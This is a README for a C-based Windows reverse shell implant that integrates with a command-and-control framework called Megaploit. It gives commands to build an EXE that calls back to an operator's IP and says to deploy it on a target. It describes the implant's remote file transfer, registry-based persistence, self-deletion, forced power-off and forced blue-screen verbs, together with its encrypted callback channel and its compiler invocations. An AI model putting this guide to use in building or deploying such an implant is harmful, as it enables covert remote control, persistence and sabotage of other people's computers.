# C-remote-shell

A hardened Windows reverse shell client that integrates fully with the
Megaploit C2. All traffic is protected by four stacked security layers
that exactly mirror the Megaploit listener protocol.

---

## C2 Integration

The C client speaks the same wire protocol as the Python and Go agents, so
it appears as a normal session in the Megaploit CLI. No special mode or
flag is needed on the server — just start the listener and run the EXE on
the target.

### Generate the EXE from inside the C2 console

```
megaploit> generate_c 10.0.0.1 4444
```

`generate_c` will:
1. Run a 46-signal compliance probe against the C source tree (build is
   aborted if any required signal is missing).
2. Auto-discover all `.c` files and `config.h` — no subdirectory names are
   hardcoded in Python.
3. Patch `config.h` with the supplied IP, port, and the session's secret
   key (embedded as a hex array — no `secret.key` file needed on the target).
4. Compile via MSVC (`cl.exe`) or MinGW (`x86_64-w64-mingw32-gcc`),
   whichever is on PATH.

```
  C2 Compliance Probe Report
  ...
  Summary: 33/33 required signals found  (46/46 total)
  Verdict: [+] COMPLIANT

[+] C-agent built: megaploit_c_agent.exe
    Size:   145,920 bytes
    SHA256: a1b2c3d4...
    Time:   4.2s

    Deploy to target and run -- it will call back to 10.0.0.1:4444
```

### Start the Megaploit listener

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
python3 server.py -lh 0.0.0.0 -p 4444 --cert cert.pem --key key.pem
```

Once the client connects, the session appears in `sessions` exactly like
a Python agent session.

---

## Supported Commands

All standard Megaploit session commands work via the `_popen()` shell
fallback. Commands explicitly handled inside the C client are listed below.

### Shared verbs (same wire string as the Python agent)

| Command | C handler | Notes |
|---------|-----------|-------|
| `exit` | clean TLS disconnect | Standard C2 disconnect |
| `sysinfo` | `GetComputerName`, `RtlGetVersion`, `GetNativeSystemInfo` | OS, hostname, user, arch, CWD |
| `cd <path>` | `SetCurrentDirectoryA` | |
| `upload <name>` | `tls_recv_msg` + `fwrite` | Receives framed file, writes to disk |
| `download <path>` | `fread` + `tls_send_msg` | Sends `FILE_OK` then framed bytes |
| `persist <key> <file>` | `CopyFile` + `reg add` | Copies EXE to `%APPDATA%`, sets HKCU Run |
| `self_destruct` | `reg delete` + `cmd /c del` | Removes persistence key, schedules EXE wipe |

### C-exclusive verbs (auto-detected by `c_probe`)

These are verbs present in the C `strncmp()` dispatch but absent from the
Python agent. `megaploit/core/c_probe.py` discovers them at server startup
and `commands.py` registers the operator commands automatically — no verb
strings are hardcoded in Python.

| Operator command | Wire string sent | C handler |
|-----------------|------------------|-----------|
| `forceoff` | `forceOff()` | `NtSetSystemPowerState` + `NtShutdownSystem` — immediate hardware power-off |
| `bluescreen` | `blueScreen()` | `NtRaiseHardError(STATUS_ASSERTION_FAILURE)` — immediate kernel BSOD |

**Adding a new C-exclusive command** requires only one step: add a
`strncmp("myVerb()", ...)` branch in `client/shell.c`. The prober detects
it and the operator command appears automatically at the next server start.

---

## Security Layers

All four layers are applied inside `tls_connect()` before any shell traffic.

| # | Layer | Implementation | Mirrors |
|---|-------|----------------|---------|
| 1 | **TLS 1.2 / 1.3** | SChannel — `SP_PROT_TLS1_2_CLIENT \| SP_PROT_TLS1_3_CLIENT`, `SCH_USE_STRONG_CRYPTO` (AEAD-only), `ISC_REQ_NO_RENEGOTIATION` | `listener.py` `build_agent_ssl_context()` |
| 2 | **HMAC-SHA256** | BCrypt — server sends 16-byte nonce, client replies with `HMAC-SHA256(key, nonce)` = 32 bytes | `crypto.py` `agent_authenticate()` |
| 3 | **Protocol v2** | Server sends `0x4d`; client echoes back | `protocol.py` `handshake_agent()` |
| 4 | **AES-256-GCM** | BCrypt — `[uint32-BE len][nonce(12)][ct+tag(16)]`, uint64-BE seq counter (replay protection) | `protocol.py` `send_msg()` / `recv_msg()` |

The compliance prober (`megaploit/core/c_probe.py`) verifies **33 required
signals** across all four layers before `generate_c` will compile the client.

---

## Project Layout

```
C-remote-shell/
|
+-- client/               # Windows implant (target-side)
|   +-- config.h          # C2_IP, C2_PORT, key path, reconnect delay
|   +-- ntcalls.h         # NT syscall typedefs + extern declarations
|   +-- ntcalls.c         # GetProcAddress loader + SeShutdown privilege check
|   +-- shell.h           # shell_run() declaration
|   +-- shell.c           # Verb dispatch table + _popen fallback
|   |                     #   strncmp() calls here are the source of truth
|   |                     #   for c_probe verb extraction
|   +-- main.c            # WinMain: mutex, Winsock, key embed, reconnect loop
|
+-- tls/                  # Encrypted transport (Windows-native, no OpenSSL)
|   +-- tls_client.h      # TLS_CONTEXT struct + public API (4 functions)
|   +-- tls_client.c      # SChannel TLS 1.2/1.3 + BCrypt AES-GCM + HMAC-SHA256
|
+-- server/               # Standalone operator console (no C2 required)
|   +-- config.h          # LISTEN_PORT, LISTEN_ADDR
|   +-- server.h/c        # socket / bind / listen / accept
|   +-- prompt.h/c        # stdin -> send -> recv -> print loop
|   +-- main.c            # entry point
|
+-- Makefile              # MSVC + MinGW build targets; C2_IP/C2_PORT overrides
+-- definitions.h         # Legacy compatibility shim
+-- CHANGELOG.md          # Full bug-fix log and developer guide
+-- README.md             # This file
```

---

## Configuration

| File | Symbol | Default | Description |
|------|--------|---------|-------------|
| `client/config.h` | `C2_IP` | `192.168.1.226` | C2 server IP (overridden by `generate_c` at build time) |
| `client/config.h` | `C2_PORT` | `50005` | TCP port (overridden by `generate_c`) |
| `client/config.h` | `SECRET_KEY_PATH` | `"secret.key"` | Key file path (unused when built via `generate_c`) |
| `client/config.h` | `RECONNECT_DELAY_SEC` | `10` | Seconds between reconnect attempts |
| `server/config.h` | `LISTEN_PORT` | `50005` | Standalone server listen port |
| `server/config.h` | `LISTEN_ADDR` | `INADDR_ANY` | Standalone server listen address |

---

## Building Manually

### Option A — Makefile (recommended)

```bat
REM MSVC (run from Developer Command Prompt)
make

REM MinGW (Linux / macOS)
make CC=x86_64-w64-mingw32-gcc

REM Override IP and port
make C2_IP=10.0.0.1 C2_PORT=4444
```

### Option B — direct compiler invocation

**Client (Windows, MSVC)**

```bat
cl /W4 /nologo ^
   client\main.c client\ntcalls.c client\shell.c tls\tls_client.c ^
   /link Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib ^
   /out:client.exe
```

**Client (cross-compile, MinGW)**

```bash
x86_64-w64-mingw32-gcc -O2 -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
    client/main.c client/ntcalls.c client/shell.c tls/tls_client.c \
    -o client.exe \
    -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -mwindows
```

**Standalone server (Linux / macOS)**

```bash
gcc -Wall -o server server/main.c server/server.c server/prompt.c
```

---

## What Changed from the Original

See [`CHANGELOG.md`](CHANGELOG.md) for the full bug-fix log.

**Client (`Source.c` -> `client/`)**
- `"exit"` dispatch added (C2 sends `exit`, not `q`)
- Full C2 verb table: `sysinfo`, `cd`, `upload`, `download`, `persist`, `self_destruct`
- NT status check was inverted — fixed
- `CreateMutexA` with wide-string literal — fixed
- `WSAStartup(MAKEWORD(2,0))` -> `MAKEWORD(2,2)`
- `fclose()` on `_popen()` handle -> `_pclose()`
- `forceOff()` `strncmp` length `11` -> `10`

**Server (`serverShell.c` -> `server/`)**
- `sin_addr.s_addr` never assigned — fixed (bind address was undefined)
- `forceOff()` `strncmp` length `12` -> `10`
- Dangling `else` caused `blueScreen()` to fall into `recv()` — fixed
- `write()` sent full 1024-byte buffer — fixed to use `strlen`
- `socket()` and `accept()` return values now checked

**TLS layer (`tls/tls_client.h` + `tls/tls_client.c`)**
- Full four-layer security stack added (was plain TCP before)
- Dead empty `if` block removed from `_tls_handshake` loop

**Python integration (`megaploit/core/c_probe.py`)**
- 46-signal compliance prober — verifies all four security layers
- `extract_verbs()` — reads exact C dispatch strings from `strncmp()` calls
- `c_exclusive_verbs()` — isolates verbs not handled by the Python agent
- `commands.py` auto-registers C-exclusive operator commands at startup
